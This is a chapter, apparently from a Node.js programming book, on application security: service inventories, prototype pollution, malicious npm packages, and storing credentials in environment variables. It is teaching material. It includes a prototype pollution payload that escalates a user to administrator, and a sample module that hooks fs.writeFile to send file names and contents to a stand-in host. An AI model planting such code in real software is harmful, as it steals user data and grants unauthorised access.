<html><head></head><body><section data-pdf-bookmark="Chapter 10. Security" data-type="chapter" epub:type="chapter"><div class="chapter" id="ch_security">&#13;
<h1><span class="label">Chapter 10. </span>Security</h1>&#13;
&#13;
&#13;
<p>Security is an important concern for all applications, especially those exposed to a network. Traditionally, the biggest vulnerability to affect web applications is the humble SQL injection attack. This attack was perpetrated for many years by a prevalence of bad documentation and libraries that required users to manually build SQL query strings. Thankfully, the programming community has evolved significantly over the past decade, and you’d be hard-pressed to find a modern library or tutorial that promotes query string concatenation.</p>&#13;
&#13;
<p>Still, SQL injection remains one of the highest risks when it comes to application security and is ranked number one on the <a class="orm:hideurl" href="https://owasp.org/www-project-top-ten/">OWASP Top Ten list</a>. SQL injection attacks are so highly documented, and vulnerable edge cases in database libraries come with big enough warning signs, that I won’t bother covering them in this chapter.</p>&#13;
&#13;
<p>There are, however, some new and unique challenges that seem to be intrinsic to the Node.js platform, challenges that aren’t as widely understood. There is even some relatively recent tooling that helps automate the discovery and patching of these vulnerabilities. These challenges and tools are the focus of this chapter.</p>&#13;
&#13;
<p>One of these challenges is determining an application’s attack surface. Traditionally, attacks come from external sources, like an attacker sending a malicious request over the network. But what happens when an attacker writes malicious code that makes its way into a package that your application depends on?</p>&#13;
&#13;
<p>Before diving into individual security issues, it’s important to come up with a checklist to help identify the health of disparate applications. This is especially true at an organization that uses many different microservices to power an application.</p>&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
<section data-pdf-bookmark="Wrangling Repositories" data-type="sect1"><div class="sect1" id="idm46291173643800">&#13;
<h1>Wrangling Repositories</h1>&#13;
&#13;
<p>A common pattern for building <a data-primary="security" data-secondary="repositories" data-type="indexterm" id="secrepo"/><a data-primary="repositories" data-type="indexterm" id="secrepo1"/>backend systems is to represent various domains of an application using microservices. This usually happens by creating separate version control repositories, initializing a new module structure, and then adding JavaScript files, either by scratch or by emulating patterns used in other repositories.</p>&#13;
&#13;
<p>In these situations, there’s usually a 1:N ownership between teams and repositories, although sometimes there are a few popular projects that multiple teams contribute to. Other times, some repositories end up orphaned and without a clear owner. I’ve personally worked at companies where several teams collectively own a few dozen microservices.</p>&#13;
&#13;
<p>The teams that own these projects have different priorities. Sometimes a team puts a lot of emphasis on keeping projects up to date and keeping security patches applied. Other times, a project’s <em>package-lock.json</em> may remain untouched for months or years at a time.</p>&#13;
&#13;
<p>It’s sometimes necessary to designate an engineer to take ownership of the health of all Node.js projects across an organization. I usually volunteer to take on this role when I join a company. Doing so both helps keep things under control for the company and helps me get familiar with the company’s microservices and how they interoperate.</p>&#13;
&#13;
<p>A pattern that I’ve adopted, and that I recommend you consider as well, is to first hunt down the different services used by the company and to maintain a spreadsheet of all the different encountered services.</p>&#13;
&#13;
<p>Even though applications might run in a few different paradigms (Kubernetes over here, a dedicated VPS over there, and a sprinkle of Lambda), organizations usually keep all their code organized using a single version control service. This tool is the best place to get a list of services. GitHub, for example, provides the ability to list repositories by language:</p>&#13;
&#13;
<pre data-type="programlisting">https://github.com/&lt;org&gt;?language=javascript</pre>&#13;
&#13;
<p>Once you obtain a list of repositories in your organization, you’ll need to narrow entries down until you have a list of only active Node.js services. Make a new row in the sheet for every service you find. Be sure to track any relevant information you can in the sheet, such as a link to the repo, the team that owns the repo, the deployment medium, and most importantly, the version of Node.js that the project runs on.</p>&#13;
&#13;
<p>I like to keep track of some other information as well, such as the versions of important packages used by the project. For example, the name and version of the web server package, and if applicable, the version of any integral packages that are maintained by the organization. The web server is important to track because, as far as security goes, it’s the main entry and exit point for an HTTP server. It’s often the most complex part of an application, and so is one of the more likely components to expose a security vulnerability.</p>&#13;
&#13;
<p>Some organizations choose to publish internal packages for communicating with vital services, instead of documenting and exposing the protocol used to communicate with the service. For example, a company might have an account package published as <code>@corp/acct</code>. Keeping track of these internal packages is also important since it may drive decisions on what features to deprecate and drop in the account service.</p>&#13;
&#13;
<p><a data-type="xref" href="#table_node_services">Table 10-1</a> is an example of some of the information that could be tracked in such a spreadsheet.</p>&#13;
<table id="table_node_services">&#13;
<caption><span class="label">Table 10-1. </span>Example Node.js service spreadsheet</caption>&#13;
<thead>&#13;
<tr>&#13;
<th>Service</th>&#13;
<th>Team</th>&#13;
<th>Node.js version</th>&#13;
<th>Deployment</th>&#13;
<th>Server</th>&#13;
<th>Account package</th>&#13;
</tr>&#13;
</thead>&#13;
<tbody>&#13;
<tr>&#13;
<td><p>gallery</p></td>&#13;
<td><p>Selfie</p></td>&#13;
<td><p>v10.3.1</p></td>&#13;
<td><p>Beanstalk</p></td>&#13;
<td><p>express@v3.1.1</p></td>&#13;
<td><p>@corp/acct@v1.2.3</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td><p>profile</p></td>&#13;
<td><p>Profile</p></td>&#13;
<td><p>v12.1.3</p></td>&#13;
<td><p>Kubernetes</p></td>&#13;
<td><p>@hapi/hapi@14.3.1</p></td>&#13;
<td><p>@corp/acct@v2.1.1</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td><p>resizer</p></td>&#13;
<td><p>Selfie</p></td>&#13;
<td><p>v12.13.1</p></td>&#13;
<td><p>Lambda</p></td>&#13;
<td><p>N/A</p></td>&#13;
<td><p>N/A</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td><p>friend-finder</p></td>&#13;
<td><p>Friends</p></td>&#13;
<td><p>v10.2.3</p></td>&#13;
<td><p>Kubernetes</p></td>&#13;
<td><p>fastify@2.15.0</p></td>&#13;
<td><p>@corp/acct@v2.1.1</p></td>&#13;
</tr>&#13;
</tbody>&#13;
</table>&#13;
&#13;
<p>In this table the <em>Service</em> column contains the common name of the project. This could be the name of the GitHub repository, the name of the service as it identifies itself on the network, or ideally both. The <em>Team</em> column contains the team that owns the project. Even though multiple teams may contribute to a project, it usually has some concept of an owner.</p>&#13;
&#13;
<p>The <em>Node.js version</em> column is self-explanatory, though it can sometimes be difficult to find the exact version of Node.js being used, like when running a service on AWS Lambda. In these situations, you may have to log the <code>process.version</code> value to obtain an accurate result. The <em>Deployment</em> column conveys information about how the process is deployed and managed, like running as a Kubernetes pod or via AWS Beanstalk.</p>&#13;
&#13;
<p>The <em>Server</em> column contains information about the web server package, notably the name and version. Finally, the <em>Account package</em> contains information about an internal <code>@corp/acct</code> package, which for this fictional organization happens to be very important.</p>&#13;
&#13;
<p>Now that the list is compiled, it’s time to go through and highlight any of the entries that are out of date. For example, if the current <em>Long-Term Support (LTS)</em> version of Node.js is v14, then that means Node.js v12 is probably in maintenance mode and Node.js v10 and earlier are no longer being updated. Update the <em>Node.js version</em> column to mark services in active LTS as green, services in maintenance as yellow, and services that are older as red. <a data-type="xref" href="#ch_security_sec_node">“Upgrading Node.js”</a> has information about how to handle outdated versions of Node.js.</p>&#13;
&#13;
<p>The same thing applies to package columns, such as web servers and internal modules. For those, you might need to come up with your own color-coding system. The Express and Fastify web servers, for example, rarely release new major versions, so perhaps only the current major version should be green. The Hapi framework, on the other hand, goes through major versions much more quickly, and perhaps the two most recent major versions deserve a green background. <a data-type="xref" href="#ch_security_sec_deps">“Upgrading Dependencies”</a> covers solutions for automating package upgrades.</p>&#13;
<div data-type="tip"><h6>Tip</h6>&#13;
<p>I encourage you to do some detective work and assemble such a spreadsheet for the services in your organization. You’ll have a much better understanding of your application once you’re done. This sheet will be a great source of information when it comes to <a data-primary="security" data-secondary="repositories" data-startref="secrepo" data-type="indexterm" id="idm46291173598728"/><a data-primary="repositories" data-startref="secrepo1" data-type="indexterm" id="idm46291173597480"/>reducing tech debt.</p>&#13;
</div>&#13;
</div></section>&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
<section data-pdf-bookmark="Recognizing Attack Surface" data-type="sect1"><div class="sect1" id="ch_security_subsec_surface">&#13;
<h1>Recognizing Attack Surface</h1>&#13;
&#13;
<p>Most attacks seem to happen at <a data-primary="security" data-secondary="attack surface" data-type="indexterm" id="attsurf"/><a data-primary="attack surface" data-type="indexterm" id="attsurf1"/>the fringes of an application where one paradigm meets another. Some common examples of this include converting an incoming HTTP request into a JavaScript object, taking a modified object and serializing it into an SQL query, and taking an object and generating an HTML document from it.</p>&#13;
&#13;
<p>Traditionally, attacks for a service usually come through the “front door,” which is to say, the part of an application that is exposed to an external consumer. With an HTTP service, this means incoming HTTP requests; with a worker process, this might mean the queue that it receives messages from; and with a daemon that converts uploaded HTML files to a PDF, the front door might be considered the filesystem.</p>&#13;
&#13;
<p>These situations are straightforward to think about. Your application is essentially a castle with a big gateway in the front, so it makes sense that you should post guards there. When it comes to protecting an HTTP application, it’s then important to ensure the protocol isn’t being tampered with, the data being passed in isn’t larger than expected, and unanticipated parameters should be ignored. The <a class="orm:hideurl" href="https://helmetjs.github.io/">Helmet</a> npm package provides a middleware implementing several security best-practices for an HTTP server that you may find beneficial.</p>&#13;
&#13;
<p>The reality is that a much deeper attack surface exists inside modern applications, especially those built with Node.js. It just so happens that your castle might have a traitor lurking in the shadows. But first, let’s concentrate on the front door.</p>&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
<section data-pdf-bookmark="Parameter Checking and Deserialization" data-type="sect2"><div class="sect2" id="idm46291173588264">&#13;
<h2>Parameter Checking and Deserialization</h2>&#13;
&#13;
<p>An application must always <a data-primary="security" data-secondary="parameter checking" data-type="indexterm" id="parmcheck"/><a data-primary="security" data-secondary="deserialization" data-type="indexterm" id="deserial"/><a data-primary="parameter checking" data-type="indexterm" id="parmcheck1"/><a data-primary="de-serialization" data-type="indexterm" id="deserial1"/>verify that input received from an external source is acceptable. Sometimes the source of this input is obvious, such as the body of &#13;
<span class="keep-together">an HTTP</span> <code>POST</code> request. Other times it’s not so obvious, like with individual HTTP &#13;
<span class="keep-together">headers.</span></p>&#13;
&#13;
<p>Attacks that happen with parameter parsing and object deserialization are present in most platforms. But there are a few that seem to be more prevalent in Node.js applications, and in my opinion this is because JavaScript is such a loosely typed language and because calling <code>JSON.parse()</code> is just so easy. With other platforms, an application might have a <code>User</code> class and be provided with a JSON string that represents a user. That user class might have a few properties on it like <code>name:string</code> and <code>age:integer</code>. In that case, deserializing a JSON representation of a user can be done by streaming the JSON document through a deserializer, picking the expected properties, ignoring anything that isn’t relevant, and never using more memory than is required to represent <code>name</code> and <code>age</code>.</p>&#13;
&#13;
<p>That said, with JavaScript, the approach you’re more likely to see in an application looks like this:</p>&#13;
&#13;
<pre data-code-language="javascript" data-type="programlisting"><code class="kr">const</code> <code class="nx">temp</code> <code class="o">=</code> <code class="nx">JSON</code><code class="p">.</code><code class="nx">parse</code><code class="p">(</code><code class="nx">req</code><code class="p">.</code><code class="nx">body</code><code class="p">);</code>&#13;
<code class="kr">const</code> <code class="nx">user</code> <code class="o">=</code> <code class="k">new</code> <code class="nx">User</code><code class="p">({</code><code class="nx">name</code><code class="o">:</code> <code class="nx">temp</code><code class="p">.</code><code class="nx">name</code><code class="p">,</code> <code class="nx">age</code><code class="o">:</code> <code class="nx">temp</code><code class="p">.</code><code class="nx">age</code><code class="p">});</code></pre>&#13;
&#13;
<p>This approach has a few shortcomings. First, what if an attacker sends a massive JSON object, perhaps several megabytes? In that case, the application will slow down when it hits the <code>JSON.parse()</code> method, and it’s also going to use several megabytes of memory. What happens if an attacker sends in hundreds of requests in parallel, each with massive JSON objects? In that case, the attacker may cause server instances to become unresponsive and crash, resulting <a data-primary="attack surface" data-secondary="DoS (denial of service) attack" data-type="indexterm" id="idm46291173493832"/><a data-primary="DoS (denial of service) attack" data-type="indexterm" id="idm46291173492984"/><a data-primary="security" data-secondary="DoS (denial of service) attack" data-type="indexterm" id="idm46291173492376"/>in a <em>denial of service</em> attack.</p>&#13;
&#13;
<p>One way to fix this is to enforce a maximum request size when receiving request bodies. Every popular web framework supports this to some degree. For example, the Fastify framework supports a <code>bodyLimit</code> configuration flag that defaults to 1MB. The <code>body-parser</code> middleware package used by Express supports a <code>limit</code> flag that does the same thing, defaulting to 100KB.</p>&#13;
&#13;
<p>There are other issues when working with deserialized objects. One such issue &#13;
<span class="keep-together">is unique</span> to JavaScript and is called <em>Prototype Pollution</em>, which is an attack &#13;
<span class="keep-together">where a JSON</span> payload contains a property named <code>__proto__</code> that can be used to overwrite an object’s prototype. Calling <code>obj.__proto__ = foo</code> is equivalent to &#13;
<span class="keep-together"><code>Object.setPrototypeOf(obj, foo)</code></span> and is a dangerous shorthand that probably shouldn’t exist but still does to support legacy code. This attack was big news in 2018 and was patched in several popular libraries, but it still pops up in application code and libraries today when copying properties from one object to another.</p>&#13;
&#13;
<p><a data-type="xref" href="#ex_prototype_pollution">Example 10-1</a> is a distilled version of the prototype pollution attack.</p>&#13;
<div data-type="example" id="ex_prototype_pollution">&#13;
<h5><span class="label">Example 10-1. </span><em>prototype-pollution.js</em></h5>&#13;
&#13;
<pre data-code-language="javascript" data-type="programlisting"><code class="c1">// WARNING: ANTIPATTERN!</code>&#13;
<code class="kd">function</code> <code class="nx">shallowClone</code><code class="p">(</code><code class="nx">obj</code><code class="p">)</code> <code class="p">{</code>&#13;
  <code class="kr">const</code> <code class="nx">clone</code> <code class="o">=</code> <code class="p">{};</code>&#13;
  <code class="k">for</code> <code class="p">(</code><code class="kd">let</code> <code class="nx">key</code> <code class="k">of</code> <code class="nb">Object</code><code class="p">.</code><code class="nx">keys</code><code class="p">(</code><code class="nx">obj</code><code class="p">))</code> <code class="p">{</code>&#13;
    <code class="nx">clone</code><code class="p">[</code><code class="nx">key</code><code class="p">]</code> <code class="o">=</code> <code class="nx">obj</code><code class="p">[</code><code class="nx">key</code><code class="p">];</code>&#13;
  <code class="p">}</code>&#13;
  <code class="k">return</code> <code class="nx">clone</code><code class="p">;</code>&#13;
<code class="p">}</code>&#13;
<code class="kr">const</code> <code class="nx">request</code> <code class="o">=</code> <code class="s1">'{"user":"tlhunter","__proto__":{"isAdmin":true}}'</code><code class="p">;</code>&#13;
<code class="kr">const</code> <code class="nx">obj</code> <code class="o">=</code> <code class="nx">JSON</code><code class="p">.</code><code class="nx">parse</code><code class="p">(</code><code class="nx">request</code><code class="p">);</code>&#13;
&#13;
<code class="k">if</code> <code class="p">(</code><code class="s1">'isAdmin'</code> <code class="k">in</code> <code class="nx">obj</code><code class="p">)</code> <code class="k">throw</code> <code class="k">new</code> <code class="nb">Error</code><code class="p">(</code><code class="s1">'cannot specify isAdmin'</code><code class="p">);</code>&#13;
<code class="kr">const</code> <code class="nx">user</code> <code class="o">=</code> <code class="nx">shallowClone</code><code class="p">(</code><code class="nx">obj</code><code class="p">);</code>&#13;
<code class="nx">console</code><code class="p">.</code><code class="nx">log</code><code class="p">(</code><code class="nx">user</code><code class="p">.</code><code class="nx">isAdmin</code><code class="p">);</code> <code class="c1">// true</code></pre></div>&#13;
&#13;
<p>In this example, an attack provides a request object with a <code>__proto__</code> property that is itself another object. In this object, the <code>isAdmin</code> property is set to true. The application code relies on this field to know if a privileged user made a request. The application receives the request and parses the request JSON into an object named <code>obj</code>. At this point the object has a property on it named <code>__proto__</code>, though it doesn’t have the invalid prototype set just yet; luckily <code>JSON.parse()</code> isn’t able to directly override an object’s prototype. Next, the application checks to see if the <code>obj.isAdmin</code> field has been set, which is one way of ensuring a user didn’t override the property. This check isn’t triggered, and the code continues.</p>&#13;
&#13;
<p>Next, the application performs a shallow clone of the request object and returns the result. The <code>shallowClone()</code> method makes the clone by iterating every property of the object and assigns it to a new object. This is where the vulnerability lies. The <code>clone['__proto__']</code> assignment is what causes the prototype to get overridden. In this case, the prototype for the resulting <code>user</code> object is set to the attacker-supplied <code>{"isAdmin":true}</code> object. When the application later checks the property, it results in the user’s permissions being elevated to that of an administrator.</p>&#13;
&#13;
<p>This might seem a little far-fetched at first. But this actually affected many different applications and lead to security patches to at least dozens of npm packages. With the way modern Node.js applications are built, one third-party middleware is parsing request objects and another middleware is cloning objects, and all of that happens behind the scenes before application controller logic finally gets access to the parsed JSON representation. Due to all this movement of data between hard-to-see corners of the application, it can be difficult for developers to keep track of what a complex Node.js application is actually <a data-primary="security" data-secondary="parameter checking" data-startref="parmcheck" data-type="indexterm" id="idm46291173361928"/><a data-primary="security" data-secondary="de-serialization" data-startref="deserial" data-type="indexterm" id="idm46291173360680"/><a data-primary="parameter checking" data-startref="parmcheck1" data-type="indexterm" id="idm46291173359464"/><a data-primary="de-serialization" data-startref="deserial1" data-type="indexterm" id="idm46291173358520"/>doing.</p>&#13;
</div></section>&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
<section data-pdf-bookmark="Malicious npm Packages" data-type="sect2"><div class="sect2" id="idm46291173587640">&#13;
<h2>Malicious npm Packages</h2>&#13;
&#13;
<p>Another attack surface skips <a data-primary="attack surface" data-secondary="packages" data-type="indexterm" id="malnpm"/><a data-primary="malicious npm packages" data-type="indexterm" id="malnpm1"/><a data-primary="npm packages" data-secondary="attacks and" data-type="indexterm" id="malnpm2"/><a data-primary="security" data-secondary="malicious npm packages" data-type="indexterm" id="secmal"/>the front door entirely. This one comes from within the application itself, through the “supply chain,” by way of maliciously crafted npm packages. These attacks can affect other platforms as well, but so far it seems to be a problem that affects the npm package repository the most for a few reasons. Package repositories of the past weren’t as easy to publish to as npm is. There is also no enforcement that code published to version control must match the code deployed in an npm package, meaning the easy-to-audit code in a GitHub repository might not represent code deployed in a tarball at package install time. While the ease to publish and the dynamic nature of JavaScript contributed to the popularity of Node.js and npm, they have undoubtedly left a security scar.</p>&#13;
&#13;
<p>Saying that packages can be used as an attack vector might sound overly cautious, but it has actually been done on several occasions.<sup><a data-type="noteref" href="ch10.html#idm46291173349672" id="idm46291173349672-marker">1</a></sup> Sometimes a malicious package is installed via <em>typo squatting</em>, which is where a package is named after a typo of a popular package. Sometimes it’s a completely new package promising features that other packages don’t deliver. Sometimes it’s much scarier than that, where a maintainer of a popular package accepts a PR introducing a subtle security flaw, or the maintainer gives ownership of the package to an attacker while assuming they’re well-meaning.</p>&#13;
&#13;
<p>At any rate, malicious packages will make their way into applications. One of the most important things Node.js developers can do to reduce the risk of getting one of these malicious packages is to keep the number of dependencies to a minimum, favor packages maintained by reputable authors, and prefer dependencies with fewer subdepenencies.</p>&#13;
&#13;
<p>One approach that some organizations try is to manually audit packages and maintain an allow-list of package versions. Unfortunately, this is a very difficult task to take on, and often requires a whole team to perform audits, a privilege only afforded by larger tech companies. By manually reviewing which packages may be used within an organization, developers are often trapped, their tickets blocked while waiting on package approval requests. Also, manually auditing a package doesn’t guarantee that it is free of all vulnerabilities. Even so, approved packages probably don’t pin their subdependency versions, and unless application developers are explicitly pinning them in a <em>package-lock.json</em> file, there’s no guarantee that a new malicious package won’t sneak in.</p>&#13;
&#13;
<p>A common misconception with malicious packages is that they are only dangerous if they directly touch user data as it flows through an application—and that deeply nested utility modules aren’t of much risk. In reality, any module that is loaded within a Node.js application has the ability to modify any core Node.js API in any way that it sees fit.</p>&#13;
&#13;
<p><a data-type="xref" href="#ex_malicious_module">Example 10-2</a> depicts a Node.js module that, once required, intercepts any filesystem writes and transmits it to a third-party service.</p>&#13;
<div data-type="example" id="ex_malicious_module">&#13;
<h5><span class="label">Example 10-2. </span><em>malicious-module.js</em></h5>&#13;
&#13;
<pre data-code-language="javascript" data-type="programlisting"><code class="kr">const</code> <code class="nx">fs</code> <code class="o">=</code> <code class="nx">require</code><code class="p">(</code><code class="s1">'fs'</code><code class="p">);</code>&#13;
<code class="kr">const</code> <code class="nx">net</code> <code class="o">=</code> <code class="nx">require</code><code class="p">(</code><code class="s1">'net'</code><code class="p">);</code>&#13;
<code class="kr">const</code> <code class="nx">CONN</code> <code class="o">=</code> <code class="p">{</code> <code class="nx">host</code><code class="o">:</code> <code class="s1">'example.org'</code><code class="p">,</code> <code class="nx">port</code><code class="o">:</code> <code class="mi">9876</code> <code class="p">};</code>&#13;
<code class="kr">const</code> <code class="nx">client</code> <code class="o">=</code> <code class="nx">net</code><code class="p">.</code><code class="nx">createConnection</code><code class="p">(</code><code class="nx">CONN</code><code class="p">,</code> <code class="p">()</code> <code class="o">=&gt;</code> <code class="p">{});</code>&#13;
<code class="kr">const</code> <code class="nx">_writeFile</code> <code class="o">=</code> <code class="nx">fs</code><code class="p">.</code><code class="nx">writeFile</code><code class="p">.</code><code class="nx">bind</code><code class="p">(</code><code class="nx">fs</code><code class="p">);</code>&#13;
<code class="nx">fs</code><code class="p">.</code><code class="nx">writeFile</code> <code class="o">=</code> <code class="kd">function</code><code class="p">()</code> <code class="p">{</code>&#13;
  <code class="nx">client</code><code class="p">.</code><code class="nx">write</code><code class="p">(</code><code class="sb">`</code><code class="si">${</code><code class="nb">String</code><code class="p">(</code><code class="nx">arguments</code><code class="p">[</code><code class="mi">0</code><code class="p">])</code><code class="si">}</code><code class="sb">:::</code><code class="si">${</code><code class="nb">String</code><code class="p">(</code><code class="nx">arguments</code><code class="p">[</code><code class="mi">1</code><code class="p">])</code><code class="si">}</code><code class="sb">`</code><code class="p">);</code>&#13;
  <code class="k">return</code> <code class="nx">_writeFile</code><code class="p">(...</code><code class="nx">arguments</code><code class="p">);</code>&#13;
<code class="p">};</code></pre></div>&#13;
&#13;
<p>This module replaces the existing <code>fs.writeFile</code> method with a new one that proxies requests to the original method. But it also takes the filename and data arguments from the method and transmits them to a third-party service listening at <code>example.org:9876</code>. In this case, no matter how deeply nested the module is, it still intercepts calls to a core Node.js API.</p>&#13;
&#13;
<p>This approach can be used to wrap other modules as well. For example, it can be easily modified to wrap a database package like <code>pg</code> and transmit payloads representing writes to a Postgres database <a data-primary="security" data-secondary="attack surface" data-startref="attsurf" data-type="indexterm" id="idm46291173200904"/><a data-primary="attack surface" data-startref="attsurf1" data-type="indexterm" id="idm46291173199720"/><a data-primary="attack surface" data-secondary="malicious npm packages" data-startref="malnpm" data-type="indexterm" id="idm46291173198776"/><a data-primary="malicious npm packages" data-startref="malnpm1" data-type="indexterm" id="idm46291173197560"/><a data-primary="npm packages" data-secondary="malicious npm packages" data-startref="malnpm2" data-type="indexterm" id="idm46291173196616"/><a data-primary="security" data-secondary="malicious npm packages" data-startref="secmal" data-type="indexterm" id="idm46291173195400"/>table any time it contains a field named <em>password</em>.</p>&#13;
</div></section>&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
</div></section>&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
<section data-pdf-bookmark="Application Configuration" data-type="sect1"><div class="sect1" id="ch_security_sec_config">&#13;
<h1>Application Configuration</h1>&#13;
&#13;
<p>Applications are configured by setting <a data-primary="security" data-secondary="application co nfiguration" data-type="indexterm" id="appconf"/><a data-primary="applications" data-secondary="configuration, security and" data-type="indexterm" id="appconf1"/>various key/value pairs that are used by code. These values can be things like the path to a directory for writing temporary files, the number of items to grab from a queue, or the hostname for a Redis instance. At first glance, such configuration values might not look like they have much to do with security, but configuration often contains more sensitive information. For example, it might include a Postgres connection username and password, or an API key for a GitHub account.</p>&#13;
&#13;
<p>When dealing with sensitive configuration values, it’s important to keep them not only out of the hands of an attacker, but also away from anyone in an organization who doesn’t need access. One rule of thumb is to treat every repository like it could be open sourced tomorrow, as well as to consider any credentials that have been checked in as being compromised. Employee laptops can get stolen, after all. But how can an application be built while keeping credentials out of the codebase?</p>&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
<section data-pdf-bookmark="Environment Variables" data-type="sect2"><div class="sect2" id="idm46291173187944">&#13;
<h2>Environment Variables</h2>&#13;
&#13;
<p>The best way to keep <a data-primary="environment variables" data-secondary="application security" data-type="indexterm" id="envsecurity"/><a data-primary="variables" data-secondary="environment variables" data-tertiary="application security" data-type="indexterm" id="envsecurity1"/>configuration out of an application’s codebase is to provide such values via environment variables. This way, a compromised code repository shouldn’t lead to sensitive data being stolen. Run the following two commands as a quick refresher on how environment variables work:</p>&#13;
&#13;
<pre data-code-language="bash" data-type="programlisting"><code class="nv">$ </code><code class="nb">echo</code> <code class="s2">"console.log('conn:', process.env.REDIS)"</code> &gt; app-env-var.js&#13;
<code class="nv">$ REDIS</code><code class="o">=</code><code class="s2">"redis://admin:hunter2@192.168.2.1"</code> node app-env-var.js</pre>&#13;
&#13;
<p>This example creates a simple <em>app-env-var.js</em> file that prints a configuration value and then executes the file while providing an environment variable. With this approach, the environment variables are never written to disk.<sup><a data-type="noteref" href="ch10.html#idm46291173180200" id="idm46291173180200-marker">2</a></sup></p>&#13;
&#13;
<p>There’s a very useful side effect of using environment variables to configure an application—the application can be redeployed without needing to be built again! Many service deployment tools, including Kubernetes, allow you to change environment variables and deploy the application again using the same Docker image build. This saves time by not requiring you to go through the process of changing a configuration value in code, making a pull request, letting the tests run, etc.</p>&#13;
&#13;
<p>Environment variables are set once, before an application first runs, and are then considered static throughout the lifetime of the process. Any values that need to be changed dynamically require a different tool to access the configuration values—tools such as Etcd are often used for keeping track of information that doesn’t change frequently but can change at runtime, such as the hostnames of database servers.</p>&#13;
&#13;
<p>The only real downside to this approach is that a developer has to set several environment variables before running an application locally. Depending on how the application is built, it may either conveniently crash when first executed or later, when a database tries to connect to a server named <em>undefined</em>.</p>&#13;
&#13;
<p>When designing an application that reads environment variables, consider crashing immediately if any required values are missing and printing a message that can help the developer. Here’s an example of a helpful termination message:</p>&#13;
&#13;
<pre data-code-language="javascript" data-type="programlisting"><code class="k">if</code> <code class="p">(</code><code class="o">!</code><code class="nx">process</code><code class="p">.</code><code class="nx">env</code><code class="p">.</code><code class="nx">REDIS</code><code class="p">)</code> <code class="p">{</code>&#13;
  <code class="nx">console</code><code class="p">.</code><code class="nx">error</code><code class="p">(</code><code class="s1">'Usage: REDIS=&lt;redis_conn&gt; node script.js'</code><code class="p">);</code>&#13;
  <code class="nx">process</code><code class="p">.</code><code class="nx">exit</code><code class="p">(</code><code class="mi">1</code><code class="p">);</code>&#13;
<code class="p">}</code></pre>&#13;
&#13;
<p>One way to make things easier for developers is to create an “env file,” which is a file containing key/value pairs that are exported. By sourcing this file in the shell, the different environment variable pairs are loaded for the terminal session. With this approach, the env file should never be checked into the repository. It can either be added to the repository’s <em>.gitignore</em> file if it’s a file that multiple engineers are likely to use, or it can be added to a particular engineer’s global git ignore file if only one engineer uses it.</p>&#13;
&#13;
<p>Create a new file named <em>dev.env</em> and add the content from <a data-type="xref" href="#ex_env_file">Example 10-3</a> to it. This is an example of an env file that contains a single entry.</p>&#13;
<div data-type="example" id="ex_env_file">&#13;
<h5><span class="label">Example 10-3. </span><em>dev.env</em></h5>&#13;
&#13;
<pre data-code-language="shell" data-type="programlisting"><code class="nb">export </code><code class="nv">REDIS</code><code class="o">=</code>redis://admin:hunter2@192.168.2.1</pre></div>&#13;
&#13;
<p>This file is named <em>dev.env</em> to indicate that it contains environment variable configuration for the development environment. By default, the values in the file are not available in your terminal, but once the file has been sourced, they will stick around until manually removed or until the terminal session exits. Run the following commands to prove this:</p>&#13;
&#13;
<pre data-code-language="shell" data-type="programlisting"><code class="nv">$ </code>node -e <code class="s2">"console.log(process.env.REDIS)"</code>&#13;
&gt; undefined&#13;
<code class="nv">$ </code><code class="nb">source </code>dev.env&#13;
<code class="nv">$ </code>node -e <code class="s2">"console.log(process.env.REDIS)"</code>&#13;
&gt; redis://admin:hunter2@192.168.2.1</pre>&#13;
&#13;
<p>Running the <code>node</code> command several <a data-primary="node command" data-type="indexterm" id="idm46291173073288"/><a data-primary="commands" data-secondary="node" data-type="indexterm" id="idm46291173072648"/>times after the file has been sourced should result in the same message appearing.</p>&#13;
<div data-type="note" epub:type="note"><h6>Note</h6>&#13;
<p>Sourcing subsequent env files will overwrite the previous values, but only if they’ve been set in the new file. Be sure to define the same environment variables in every env file; otherwise, you’ll end up with values for multiple environments.</p>&#13;
</div>&#13;
&#13;
<p>With this approach, you’re back at square one where a compromised developer laptop leads to compromised credentials. That said, if the contents of the repository are compromised (or a temporary contractor gets access), the environment variables <a data-primary="environment variables" data-secondary="application security" data-startref="envsecurity" data-type="indexterm" id="idm46291173082856"/><a data-primary="variables" data-secondary="environment variables" data-startref="envsecurity1" data-tertiary="application security" data-type="indexterm" id="idm46291173081608"/>are still safe.</p>&#13;
</div></section>&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
&#13;
<section data-pdf-bookmark="Configuration Files" data-type="sect2"><div class="sect2" id="idm46291173187320">&#13;
<h2>Configuration Files</h2>&#13;
&#13;
<p>In most applications I’ve encountered, <a data-primary="security" data-secondary="configuration files" data-type="indexterm" id="sec_config"/><a data-primary="configuration files" data-secondary="security and" data-type="indexterm" id="sec_config1"/>configuration files are used as a grab bag to store any and all configuration values. Anything that is traditionally represented as full-caps constants might get moved into these files. The usual pattern is to have a separate configuration file for each environment, such as <em>config/staging.js</em> and <em>config/production.js</em>. With this approach, applications usually hard-code information like hostnames and ports on a per-environment basis.</p>&#13;
&#13;
<p>This approach violates the security concerns outlined previously, but that doesn’t mean the pattern can’t be leveraged in other ways. Storing information that doesn’t include credentials and hostnames remains acceptable, especially when an application needs to behave separately in different environments. The best way to securely use configuration files is to have them read sensitive information from environment &#13;
<span class="keep-together">variables.</span></p>&#13;
&#13;
